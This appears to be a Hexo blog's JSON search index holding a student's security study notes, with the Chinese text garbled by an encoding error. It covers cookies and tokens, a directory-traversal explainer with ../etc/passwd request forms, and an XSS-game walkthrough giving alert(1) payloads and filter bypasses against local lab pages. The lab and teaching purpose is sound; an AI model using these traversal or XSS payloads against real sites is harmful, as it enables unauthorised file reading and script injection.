{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"Smtsec","url":"https://singlemindedt.github.io","root":"/"},"pages":[{"title":"è¿·è·¯äº†404","date":"2019-08-31T01:24:31.422Z","updated":"2019-08-31T01:24:18.825Z","comments":true,"path":"404.html","permalink":"https://singlemindedt.github.io/404.html","excerpt":"","text":""},{"title":"about me","date":"2019-08-31T01:12:58.000Z","updated":"2019-12-17T13:57:59.289Z","comments":true,"path":"about/index.html","permalink":"https://singlemindedt.github.io/about/index.html","excerpt":"","text":"å°±è¯»äºCUMTï¼Œç›®å‰æ˜¯å¤§ä¸‰ï¼Œéšä¾¿çå†™å†™ï¼Œå†™çš„ä¸å¥½ï¼Œè¿˜æœ›å„ä½è½»ç‚¹åæ§½ğŸ˜…æœ‰äº‹å¯ä»¥è”ç³»æˆ‘è”ç³»æ–¹å¼ï¼šæ‰£æ‰£MTcyNzMzMDAxOA==ï¼ˆğŸ˜æ³¨æ˜æ¥æ„å“¦~ï¼‰"}],"posts":[{"title":"cookieã€sessionã€token","slug":"cookie","date":"2020-09-11T08:59:48.000Z","updated":"2020-09-14T06:45:48.381Z","comments":true,"path":"2020/09/11/cookie/","link":"","permalink":"https://singlemindedt.github.io/2020/09/11/cookie/","excerpt":"","text":"ğŸ–ï¼š HTTPä¸ºæ— çŠ¶æ€åè®®,å³æœ¬æ¬¡è¯·æ±‚å’Œä¸Šä¸€æ¬¡çš„è¯·æ±‚ä¸å­˜åœ¨å…³è”æ€§ï¼› æ¯”å¦‚ï¼šæˆ‘åœ¨www.a.com/login.phpé‡Œé¢ç™»é™†äº†ï¼Œæˆ‘åœ¨www.a.com/index.php ä¹Ÿå¸Œæœ›æ˜¯ç™»é™†çŠ¶æ€ï¼Œä½†æ˜¯ï¼Œè¿™æ˜¯2ä¸ªä¸åŒçš„é¡µé¢ï¼Œä¹Ÿå°±æ˜¯2ä¸ªä¸åŒçš„HTTPè¯·æ±‚ï¼Œè¿™2ä¸ªHTTPè¯·æ±‚æ˜¯æ— çŠ¶æ€çš„ï¼Œä¹Ÿå°±æ˜¯æ— å…³è”çš„ï¼Œæ‰€ä»¥æ— æ³•å•çº¯çš„åœ¨index.phpä¸­è¯»å–åˆ°å®ƒåœ¨login.phpä¸­å·²ç»ç™»é™†äº†ï¼â€”3 1.sessionç†è§£ï¼šå­˜å‚¨ä¼šè¯æ§åˆ¶æœºåˆ¶,è¿æ¥æ ‡å¿—ï¼› ç±»ä¼¼äºä¸€ä¸ªçŠ¶æ€åˆ—è¡¨ï¼Œå­˜å‚¨äºæœåŠ¡å™¨ä¸­ï¼› ç›®çš„ï¼šä¸ºæ— çŠ¶æ€çš„HTTPæä¾›çš„æŒä¹…æœºåˆ¶ï¼› æœåŠ¡å™¨ä¸€èˆ¬ä½¿ç”¨cookieæ¥å®ç°sessionï¼ŒcookieåŒ…å«sessionçš„æ ‡è¯†ç¬¦ï¼› è¿‡ç¨‹ï¼š å®¢æˆ·ç«¯å‘é€è¯·æ±‚ æœåŠ¡å™¨æ£€æµ‹æ˜¯å¦æœ‰sessionï¼ˆæ²¡æœ‰åˆ™åˆ›å»ºä¸€ä¸ªsessionï¼Œæœ‰åˆ™åˆ©ç”¨è¯¥sessionï¼‰ï¼ŒæœåŠ¡å™¨ä¸´æ—¶ä¿å­˜sessionï¼Œç”¨æˆ·ç¦»å¼€ç½‘ç«™åé”€æ¯ +++ å…³é”®åŒºåˆ« Cookiesæ˜¯åŒ…å«ç”¨æˆ·ä¿¡æ¯çš„å®¢æˆ·ç«¯æ–‡ä»¶ï¼Œè€ŒSessionsæ˜¯åŒ…å«ç”¨æˆ·ä¿¡æ¯çš„æœåŠ¡å™¨ç«¯æ–‡ä»¶ã€‚ Cookieä¸ä¾èµ–äºSessionï¼Œä½†æ˜¯Sessionä¾èµ–äºCookieã€‚ Cookieçš„è¿‡æœŸæ—¶é—´å–å†³äºæ‚¨ä¸ºå…¶è®¾ç½®çš„ç”Ÿå­˜æ—¶é—´ï¼Œè€ŒSessionåœ¨ç”¨æˆ·å…³é—­å…¶æµè§ˆå™¨æ—¶ç»“æŸã€‚ Cookieçš„æœ€å¤§å¤§å°ä¸º4KBï¼Œè€Œåœ¨Sessionä¸­ï¼Œæ‚¨å¯ä»¥å­˜å‚¨ä»»æ„æ•°é‡çš„æ•°æ®ã€‚å¯ä»¥è¾¾åˆ°çš„å”¯ä¸€é™åˆ¶æ˜¯è„šæœ¬ä¸€æ¬¡å¯ä»¥æ¶ˆè€—çš„æœ€å¤§å†…å­˜ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸º128MB Cookieæ²¡æœ‰åä¸ºunsetcookieï¼ˆï¼‰çš„å‡½æ•°ï¼Œè€Œåœ¨Sessionä¸­æ‚¨å¯ä»¥ä½¿ç”¨Session_destroyï¼ˆï¼‰; ç”¨äºé”€æ¯æ‰€æœ‰æ³¨å†Œæ•°æ®æˆ–å–æ¶ˆè®¾ç½®æŸäº›æ•°æ® æ— éœ€å¯åŠ¨cookieï¼Œå› ä¸ºå®ƒå­˜å‚¨åœ¨æœ¬åœ°è®¡ç®—æœºä¸­ï¼Œè€Œåœ¨sessionä¸­ï¼Œ åœ¨PHPä¸­ä½¿ç”¨$ _SESSIONä¹‹å‰ï¼Œå¿…é¡»ç¼–å†™session_startï¼ˆï¼‰;ã€‚å…¶ä»–è¯­è¨€ä¹Ÿä¸€æ · +++ 2. cookieåŸºäºä¼šè¯çš„èº«ä»½éªŒè¯ ç†è§£ï¼š ç›®çš„ï¼šåŒæœåŠ¡å™¨ä¿æŒæ´»åŠ¨çŠ¶æ€ å½¢å¼ï¼šä»¥æ–‡æœ¬æ–‡ä»¶å½¢å¼å‚¨å­˜åœ¨æµè§ˆå™¨ç›®å½•ä¸­ cookieå…·æœ‰æ—¶æ•ˆæ€§ cookieç®¡ç†â€”- æŒä¹…åŒ–(å­˜å‚¨åœ¨æœ¬åœ°ç£ç›˜) éæŒä¹…åŒ–ï¼ˆå­˜å‚¨åœ¨å†…å­˜ï¼‰ ä¼šè¯å­˜å‚¨åœ¨æœåŠ¡å™¨å†…å­˜ä¸­ï¼Œå½“å¤§é‡ç”¨æˆ·åŒæ—¶ä½¿ç”¨æ—¶ï¼Œä¼šç»™æœåŠ¡å™¨é€ æˆä¸€å®šå‹åŠ›ï¼› Cookieçš„èº«ä»½éªŒè¯æ˜¯æœ‰çŠ¶æ€çš„â€”&gt;æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯åŒæ—¶ä¿ç•™èº«ä»½éªŒè¯è®°å½•æˆ–ä¼šè¯ï¼› è¿‡ç¨‹ï¼š å®¢æˆ·ç«¯å‘é€è¯·æ±‚ ç”¨æˆ·ç™»å½•username/password æœåŠ¡ç«¯æ¥æ”¶è¯·æ±‚ï¼Œè¿”å›å«Set-cookieå¤´éƒ¨çš„å“åº”åŒ… æœåŠ¡å™¨éªŒè¯å‡­æ®æ­£ç¡®æ— è¯¯ï¼Œä¸ºè¯¥ç”¨æˆ·åˆ›å»ºä¼šè¯ï¼Œå°†å…¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ å°†ä¼šè¯IDå­˜å‚¨åœ¨ç”¨æˆ·æµè§ˆå™¨çš„cookieä¸­(æ•°æ®å¤§å°å—æµè§ˆå™¨é™åˆ¶é€šå¸¸&lt;4KB) å®¢æˆ·ç«¯å†æ¬¡å‘é€è¯·æ±‚(åŒ…å«cookieï¼Œä»¥ä¾¿æœåŠ¡å™¨ç”¨æ¥å”¯ä¸€æ ‡è¯†å®¢æˆ·ç«¯èº«ä»½ä¿¡æ¯)ï¼ŒæœåŠ¡ç«¯æ¥æ”¶å¹¶éªŒè¯ç”¨æˆ·èº«ä»½ ç”¨æˆ·ä¿æŒç™»å½•çŠ¶æ€æ—¶ï¼Œcookieå°†ä¸åç»­æ¯ä¸ªè¯·æ±‚ä¸€èµ·å‘é€ æœåŠ¡å™¨å°†cookieä¸Šå­˜å‚¨çš„ä¼šè¯IDä¸å†…å­˜ï¼ˆæ•°æ®åº“ï¼‰ä¸­å­˜å‚¨çš„ä¼šè¯ä¿¡æ¯è¿›è¡Œæ¯”è¾ƒï¼Œä»¥éªŒè¯ç”¨æˆ·çš„èº«ä»½å¹¶å‘é€å“åº”çŠ¶æ€çš„å“åº” å®¢æˆ·ç«¯æ³¨é”€ç™»å½•çŠ¶æ€ï¼Œè¯¥ä¼šè¯å°†ä»å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æ•°æ®åº“ä¸­åˆ é™¤ï¼› +++ 3. tokenJWTï¼ˆJSON Web Tokenï¼‰åŸºäºä»¤ç‰Œçš„èº«ä»½éªŒè¯ ç†è§£ï¼šåŸºäºtokençš„èº«ä»½éªŒè¯æ˜¯æ— çŠ¶æ€çš„â€“&gt;æœåŠ¡å™¨ä¸ä¿ç•™ä¼šè¯ä¿¡æ¯ï¼› è®¿é—®ä»¤ç‰Œ æ„æˆï¼šuid(ç”¨æˆ·å”¯ä¸€çš„èº«ä»½æ ‡è¯†)ã€time(å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³)ã€sign(ç­¾åï¼Œç”±tokençš„å‰å‡ ä½+ç›ä»¥å“ˆå¸Œç®—æ³•å‹ç¼©æˆä¸€å®šé•¿çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¯ä»¥é˜²æ­¢æ¶æ„ç¬¬ä¸‰æ–¹æ‹¼æ¥tokenè¯·æ±‚æœåŠ¡å™¨)ã€‚ è¿‡ç¨‹ï¼š ç”¨æˆ·å‘é€è¯·æ±‚ ç”¨æˆ·ç™»å½•username/password æœåŠ¡å™¨æ¥æ”¶è¯·æ±‚ï¼ŒéªŒè¯å‡­æ®æ­£ç¡®æ— è¯¯ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªå·²ç­¾åçš„tokenï¼Œæºå¸¦è¯¥tokenä¿¡æ¯å“åº”å®¢æˆ·ç«¯ å®¢æˆ·ç«¯æ”¶åˆ°å“åº”ï¼Œå°†tokenæœ¬åœ°å­˜å‚¨æˆ–å­˜å‚¨äºä¼šè¯å­˜å‚¨æˆ–cookieä¸­ï¼Œå¹¶åœ¨åç»­çš„æ¯ä¸ªè¯·æ±‚ä¸­æºå¸¦è¯¥token æœåŠ¡å™¨æ¥æ”¶è¯·æ±‚ï¼Œæ£€æµ‹å¹¶è§£ç tokenç­¾åï¼Œä»tokenä¸­è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œæœ€åå“åº”å®¢æˆ·ç«¯ï¼ˆå°†æ­¤tokenä½œä¸ºé™„åŠ çš„Authorizationæ ‡å¤´æˆ–é€šè¿‡ä¸Šè¿°å…¶ä»–æ–¹æ³•ä¹‹ä¸€åŒ…å«åœ¨å†…ï¼‰ æœåŠ¡å™¨è§£ç token tokenæœ‰æ•ˆï¼šå¤„ç†è¯·æ±‚å¹¶å‘é€å“åº” ç”¨æˆ·æ³¨é”€ï¼šå®¢æˆ·ç«¯é”€æ¯tokenï¼ˆæ— éœ€ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼‰ ä¼˜ç‚¹ï¼šä½¿ç”¨tokenéªŒè¯æ˜¯æ— çŠ¶æ€çš„ï¼Œåç«¯æ— éœ€ä¿å­˜tokenè®°å½•ï¼› æ¯ä¸ªtokenéƒ½æ˜¯ç‹¬ç«‹çš„ï¼ŒåŒ…å«æœ‰æ•ˆæ€§å’Œç”¨æˆ·ä¿¡æ¯çš„æ‰€æœ‰æ•°æ®ï¼› æœåŠ¡å™¨åªéœ€åœ¨æˆåŠŸçš„ç™»å½•è¯·æ±‚ä¸Šå¯¹tokenè¿›è¡Œç­¾åï¼Œå¹¶éªŒè¯tokençš„æœ‰æ•ˆæ€§ï¼› å‚è€ƒï¼š å½»åº•ç†è§£cookieã€sessionã€token å½»åº•å¼„æ‡‚sessionï¼Œcookieï¼Œtoken Cookieã€Sessionã€Tokené‚£ç‚¹äº‹å„¿ï¼ˆåŸåˆ›ï¼‰ Session vs Token Based Authentication JSON Web Tokens vs. Session Cookies for Authentication Cookies vs. Tokens: The Definitive Guide Difference between Cookie and Session","categories":[],"tags":[{"name":"note","slug":"note","permalink":"https://singlemindedt.github.io/tags/note/"}]},{"title":"å‘½ä»¤è¡Œä¸‹å¸¸ç”¨æ–‡ä»¶æ“ä½œå‘½ä»¤","slug":"CD","date":"2020-09-10T05:27:08.000Z","updated":"2020-09-10T13:54:53.323Z","comments":true,"path":"2020/09/10/CD/","link":"","permalink":"https://singlemindedt.github.io/2020/09/10/CD/","excerpt":"","text":"[TOC] 1ã€è¿›å…¥ç›˜ç¬¦1234ç›´æ¥è¾“å…¥å¯¹åº”ç›®æ ‡ç›˜å­—æ¯åŠ ï¼šeg:è¿›å…¥Fç›˜f:F: 2ã€è¿›å…¥æŒ‡å®šç›®å½•12345cd ç›®å½•åï¼ˆä¸€çº§ç›®å½•ï¼‰cd ç›®å½•è·¯å¾„å¦‚æ‰“å¼€æŸä¸€çº§ç›®å½•æ–‡ä»¶åˆ™æ— éœ€cd,eg:XXX.txt +++ 3ã€åˆ©ç”¨/då‚æ•°ç›´æ¥è¿›å…¥æŸç›˜ä¸‹æŸç›®å½•12eg:è¿›å…¥Fç›˜ä¸‹toolsç›®å½•cd /d f:\\tools +++ 4ã€è¿”å›ä¸Šçº§ç›®å½•1cd .. 5ã€è¿”å›å½“å‰ç›˜æ ¹ç›®å½•12cd /cd \\ 6ã€dirå‘½ä»¤æŸ¥çœ‹è¯¥ç›®å½•ä¸‹æ–‡ä»¶åŠå­ç›®å½•åˆ—è¡¨è¯¦ç»†ä¿¡æ¯12dirdir /a * 7ã€lsåˆ—å‡ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰ä¸€çº§ç›®å½•1ls 8ã€é€šè¿‡åœ¨å‘½ä»¤ååŠ /?æŸ¥çœ‹å‘½ä»¤ç”¨æ³•1dir/?","categories":[],"tags":[{"name":"å‘½ä»¤","slug":"å‘½ä»¤","permalink":"https://singlemindedt.github.io/tags/å‘½ä»¤/"},{"name":"note","slug":"note","permalink":"https://singlemindedt.github.io/tags/note/"}]},{"title":"ç›®å½•ç©¿è¶Šæ¼æ´","slug":"ç›®å½•ç©¿è¶Šæ¼æ´","date":"2020-08-24T01:42:05.000Z","updated":"2020-08-24T04:53:15.868Z","comments":true,"path":"2020/08/24/ç›®å½•ç©¿è¶Šæ¼æ´/","link":"","permalink":"https://singlemindedt.github.io/2020/08/24/ç›®å½•ç©¿è¶Šæ¼æ´/","excerpt":"","text":"1. ç›®å½•ç©¿è¶Šç›®å½•ç©¿è¶Šçš„ç›®çš„æ—¨åœ¨è®¿é—®å­˜åœ¨äºç½‘ç«™æ ¹ç›®å½•å¤–é¢çš„æ–‡ä»¶æˆ–ç›®å½•ã€‚é€šè¿‡æµè§ˆåº”ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥å¯»æ‰¾å­˜å‚¨åœ¨WebæœåŠ¡å™¨ä¸Šçš„å…¶ä»–æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ã€‚æ”»å‡»è€…è‹¥å¯è®¿é—®ä½äºåº”ç”¨æœåŠ¡å™¨æˆ–å…¶ä»–åç«¯æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå°±å¯èƒ½å‡ºç°è·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡..\\å‘ä¸Šå›æº¯ï¼Œä»è€Œè®¿é—®æœåŠ¡å™¨ä¸Šä»»æ„æ–‡ä»¶ã€‚ 123Unixæ“ä½œç³»ç»Ÿä¸Šï¼Œ../ æ˜¯ä¸€ä¸ªæ ‡å‡†çš„è¿”å›ä¸Šä¸€çº§è·¯å¾„çš„è¯­æ³•ï¼›Windowsæ“ä½œç³»ç»Ÿä¸Šï¼Œ ../ å’Œ ..\\ éƒ½æ˜¯è¿”å›ä¸Šä¸€çº§çš„è¯­å¥ã€‚ 2. ä¸€èˆ¬å½¢å¼ï¼š12http://***/go.action?file=..\\..\\etc\\passwdhttps://www.*****.com/loadImage?filename=../../../etc/passwd 3. ç»•è¿‡æ–¹æ³•ï¼š ç»å¯¹è·¯å¾„ åŒå†™../ç»•è¿‡ URLç¼–ç ç»•è¿‡ ç»å¯¹è·¯å¾„+../ %00æˆªæ–­æ–‡ä»¶åç¼€ Unicodeç¼–ç ç»•è¿‡ 4. é˜²å¾¡ï¼š è¾“å…¥æ·»åŠ ç™½åå• php.inié…ç½®open_basedir è¿‡æ»¤å…³é”®å­—ç¬¦../ 5. å‚è€ƒï¼š ç›®å½•ç©¿è¶Š/éå†æ¼æ´ ç½‘ç«™å®‰å…¨(13) â€”â€”ç›®å½•ç©¿è¶Šæ¼æ´(Directory Traversal) ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ ä»»æ„æ–‡ä»¶è¯»å–çš„æ·±åº¦åˆ©ç”¨ æ¼æ´æ‰‹è®°-ä»»æ„æ–‡ä»¶è¯»å– ç›®å½•éå†ï¼Œæ–‡ä»¶åŒ…å«å’ŒProcæ–‡ä»¶ç³»ç»Ÿ ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è®°å½•","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"},{"name":"security","slug":"security","permalink":"https://singlemindedt.github.io/tags/security/"}]},{"title":"CTFHub-wp","slug":"CTFHub-wp","date":"2020-08-12T05:42:00.000Z","updated":"2020-08-24T04:25:09.339Z","comments":true,"path":"2020/08/12/CTFHub-wp/","link":"","permalink":"https://singlemindedt.github.io/2020/08/12/CTFHub-wp/","excerpt":"","text":"ç›®å½•éå† ç‚¹å‡»ç‚¹å‡»å¼€å§‹å¯»æ‰¾flag,ç›´æ¥ç»™å‡ºäº†ç›®å½•ï¼Œåœ¨flag_in_here/4/2ä¸‹æ‰¾åˆ°flagï¼› è¯¥é¢˜ç›®ç›´æ¥ç»™äº†æ”»å‡»è€…ç›®å½•çš„è®¿é—®æƒé™ï¼Œç›´æ¥éå†æŸ¥æ‰¾å³å¯ï¼›","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://singlemindedt.github.io/tags/wp/"}]},{"title":"XSSå°æ¸¸æˆ","slug":"XSSå°æ¸¸æˆ","date":"2020-08-04T04:35:43.000Z","updated":"2020-08-28T11:07:48.940Z","comments":true,"path":"2020/08/04/XSSå°æ¸¸æˆ/","link":"","permalink":"https://singlemindedt.github.io/2020/08/04/XSSå°æ¸¸æˆ/","excerpt":"","text":"ç¬¬1å…³è¾“å…¥å˜é‡è¢«ç›´æ¥è¾“å‡ºï¼› å°è¯•ï¼š 1127.0.0.1/xssgame-master/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt; æˆåŠŸï¼› æŸ¥çœ‹æºç ï¼š 1GETæ–¹å¼å°†nameçš„å€¼ä¼ ç»™`$str`å˜é‡ï¼Œä¸”æœªä½œä»»ä½•è¿‡æ»¤é™åˆ¶ï¼› ç¬¬2å…³keywordå˜é‡é€šè¿‡GETæ–¹å¼ä¼ å…¥ï¼Œèµ‹å€¼ç»™$strå˜é‡ï¼Œç„¶åå¸¦å…¥åˆ°&lt;h2&gt;æ ‡ç­¾ä¸­å’Œ&lt;input&gt;æ ‡ç­¾ï¼›&lt;h2&gt;æ ‡ç­¾ç»è¿‡äº†htmlspecialchars($str)ç¼–ç ï¼Œ&lt;input&gt;æ ‡ç­¾æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥å°è¯•å¯¹&lt;input&gt;æ ‡ç­¾è¿›è¡Œé—­åˆï¼Œæ¥è§¦å‘äº‹ä»¶ï¼Œä½¿ç”¨&quot;&gt;å®Œæˆé—­åˆã€‚ 1http://127.0.0.1/xssgame-master/level2.php?keyword=xss\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&amp;submit=%E6%90%9C%E7%B4%A2 æŸ¥çœ‹æºç ï¼š 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str.&apos;&quot;&gt;&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; ğŸ–ï¼šhtmlspecialchars() å®šä¹‰å’Œç”¨æ³•htmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚ é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼š &amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;amp; â€œ ï¼ˆåŒå¼•å·ï¼‰æˆä¸º &amp;quot â€˜ ï¼ˆå•å¼•å·ï¼‰æˆä¸º&amp;#039 &lt; ï¼ˆå°äºï¼‰æˆä¸º &amp;lt &gt; ï¼ˆå¤§äºï¼‰æˆä¸º &amp;gt +++ ç»htmlspecialcharsï¼ˆï¼‰å¤„ç†çš„ä»£ç ï¼š 123456789&lt;title&gt;ç¬¬2å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬2å…³ çª’æ¯çš„æ“ä½œ&lt;/h1&gt;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;&lt;/form&gt; +++ ç¬¬3å…³è¾“å…¥çš„å˜é‡è¢«htmlspecialcharså‡½æ•°å¤„ç†äº†ï¼Œè¯¥å‡½æ•°é»˜è®¤çš„é…ç½®ä¸è¿‡æ»¤å•å¼•å·ï¼Œåªæœ‰è®¾ç½®äº†:quotestyleé€‰é¡¹ä¸ºENT_QUOTESæ‰ä¼šè¿‡æ»¤æ‰å•å¼•å·ã€‚åœ¨è¿™é‡Œè¿™ä¸ªå‡½æ•°å¤„ç†çš„å­—ç¬¦æœ‰&lt; &gt; &quot; ï¼Œæ²¡æœ‰å¤„ç†å•å¼•å·ï¼Œå› æ­¤åˆ©ç”¨å•å¼•å·å’Œä¸å«&lt;&gt;çš„å‡½æ•°æ„é€ payloadï¼Œå…ˆé€šè¿‡å•å¼•å·é—­åˆvalue; 12345http://127.0.0.1/xssgame-master/level3.php?keyword=' onclick=alert(1) //http://127.0.0.1/xssgame-master/level3.php?keyword=' onclick='alert(1)'//onclick äº‹ä»¶ä¼šåœ¨å¯¹è±¡è¢«ç‚¹å‡»æ—¶å‘ç”Ÿã€‚http://127.0.0.1/xssgame-master/level3.php?keyword=' onmouseover=alert(1) x='//onmouseover äº‹ä»¶ä¼šåœ¨é¼ æ ‡æŒ‡é’ˆç§»åŠ¨åˆ°æŒ‡å®šçš„å…ƒç´ ä¸Šæ—¶å‘ç”Ÿã€‚ ğŸ–ï¼šonmouseover äº‹ä»¶ htmlspecialcharså‡½æ•°å¤„ç†æƒ…å†µï¼š +++ +++ ç¬¬4å…³è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæ„é€ ä¸åŒ…å«è¿™ä¸¤ä¸ªç¬¦å·çš„payloadï¼Œvalueçš„å€¼ä¸ç¬¬ä¸‰å…³æœ‰æ‰€å·®å¼‚ï¼Œè¿™é‡Œéœ€è¦ä½¿ç”¨åŒå¼•å·ç”¨äºé—­åˆvalueæ ‡ç­¾ï¼› 1http://127.0.0.1/xssgame-master/level3.php?keyword=\" onclick=alert(1) // å†ç‚¹å‡»ä¸€ä¸‹è¾“å…¥æ¡†å³å¯ï¼› ç¬¬5å…³&lt;script\\onè¢«æ›¿æ¢ä¸º&lt;scr_ipt\\o_n;ä½¿ç”¨å…¶ä»–çš„å‡½æ•°æ„é€ payloadï¼› ğŸ–ï¼šJavaScript äº‹ä»¶å‚è€ƒæ‰‹å†Œ ç”±äºJavaScriptäº‹ä»¶éƒ½å«æœ‰onï¼Œæ‰€ä»¥è¿™é‡Œæš‚æ—¶æ— æ³•ä½¿ç”¨JavaScriptäº‹ä»¶æ¥å¼¹çª—ï¼› è¿™é‡Œåˆ©ç”¨&lt;a&gt; æ ‡ç­¾çš„ href å±æ€§ï¼š ğŸ–ï¼š æ ‡ç­¾çš„ href å±æ€§ æ ‡ç­¾çš„ href å±æ€§ç”¨äºæŒ‡å®šè¶…é“¾æ¥ç›®æ ‡çš„ URLã€‚ href å±æ€§çš„å€¼å¯ä»¥æ˜¯ä»»ä½•æœ‰æ•ˆæ–‡æ¡£çš„ç›¸å¯¹æˆ–ç»å¯¹ URLï¼ŒåŒ…æ‹¬ç‰‡æ®µæ ‡è¯†ç¬¦å’Œ JavaScript ä»£ç æ®µã€‚å¦‚æœç”¨æˆ·é€‰æ‹©äº† æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå°è¯•æ£€ç´¢å¹¶æ˜¾ç¤º href å±æ€§æŒ‡å®šçš„ URL æ‰€è¡¨ç¤ºçš„æ–‡æ¡£ï¼Œæˆ–è€…æ‰§è¡Œ JavaScript è¡¨è¾¾å¼ã€æ–¹æ³•å’Œå‡½æ•°çš„åˆ—è¡¨ã€‚ 1\"&gt;&lt;a href=\"javascript:alert(1)\"&gt;xss&lt;/a&gt; æŸ¥çœ‹æºç ï¼š 123456789101112&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=\"'.$str3.'\"&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; ğŸ–ï¼š strtolower() å‡½æ•°æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼› ç›¸å…³ï¼š å‡½æ•° ä½œç”¨ lcfirst() æŠŠå­—ç¬¦ä¸²ä¸­çš„é¦–å­—ç¬¦è½¬æ¢ä¸ºå°å†™ strtoupper() æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ ucfirst() æŠŠå­—ç¬¦ä¸²ä¸­çš„é¦–å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ ucwords() æŠŠå­—ç¬¦ä¸²ä¸­æ¯ä¸ªå•è¯çš„é¦–å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ ç¬¬6å…³æºç ï¼š 123456789101112131415&lt;?phpini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=\"'.$str6.'\"&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; å°†â€&lt;scriptâ€ã€â€onâ€ã€â€srcâ€ã€â€dataâ€ã€â€hrefâ€éƒ½è¿›è¡Œäº†æ›¿æ¢ï¼Œä½†æœªå¯¹å¤§å°å†™è¿›è¡Œç»Ÿä¸€åˆ¤å®šå¤„ç†ï¼Œå¯åˆ©ç”¨å¤§å°å†™ç»•è¿‡ï¼› 1\"&gt;&lt;Script&gt;alert(1)&lt;/Script&gt; ç¬¬7å…³æºç ï¼š 123456789101112131415&lt;?php ini_set(\"display_errors\", 0);$str =strtolower( $_GET[\"keyword\"]);$str2=str_replace(\"script\",\"\",$str);$str3=str_replace(\"on\",\"\",$str2);$str4=str_replace(\"src\",\"\",$str3);$str5=str_replace(\"data\",\"\",$str4);$str6=str_replace(\"href\",\"\",$str5);echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=\"'.$str6.'\"&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; è¿›è¡Œäº†å°å†™è½¬æ¢ï¼ŒåŒæ—¶å°†æ•æ„Ÿå­—ç¬¦æ›¿æ¢ä¸ºç©º; å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ï¼› 1\"&gt;&lt;scscriptript&gt;alert(1)&lt;/scscriptript&gt; ç¬¬8å…³æºç ï¼š 1234567891011121314151617181920&lt;?php ini_set(\"display_errors\", 0);$str = 